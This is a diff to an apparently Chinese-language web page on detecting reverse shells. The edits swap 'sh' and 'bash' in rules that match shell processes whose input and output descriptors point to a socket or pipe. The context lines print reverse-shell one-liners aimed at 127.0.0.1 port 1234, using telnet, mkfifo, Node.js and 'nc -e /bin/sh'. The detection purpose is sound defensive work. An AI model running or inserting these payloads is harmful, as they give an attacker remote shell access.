@@ -141,8 +141,8 @@ base64搞一下命令
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG55.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
-<p>创建了sh进程，0和1描述符都指向了socket。</p>
-<p>匹配规则：sh的0，和1文件描述符指向socket</p>
+<p>创建了bash进程，0和1描述符都指向了socket。</p>
+<p>匹配规则：bash的0，和1文件描述符指向socket</p>
 <div class="highlight"><pre><span></span>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="p">|</span> /bin/sh <span class="c1">#Blind</span>
 
 rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> &gt;/tmp/f
@@ -222,8 +222,8 @@ rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG64.jpeg"/></p>
 <p>目标机执行后的结果如下：</p>
-<p>创建了bash进程，0和1描述符都指向了pipe。
-匹配规则：bash进程的0，和1文件描述符指向pipe</p>
+<p>创建了sh进程，0和1描述符都指向了pipe。
+匹配规则：sh进程的0，和1文件描述符指向pipe</p>
 <p>Nodejs</p>
 <div class="highlight"><pre><span></span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
     <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"net"</span><span class="p">),</span>
@@ -241,7 +241,7 @@ rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG66.jpeg"/></p>
 <p>目标机执行后的结果如下：
 创建了sh进程，0和1描述符都指向了socket。</p>
-<p>匹配规则：bash的0，和1文件描述符指向socket</p>
+<p>匹配规则：sh的0，和1文件描述符指向socket</p>
 <div class="highlight"><pre><span></span>require('child_process').exec('nc -e /bin/sh 127.0.0.1 1234')
 
 or
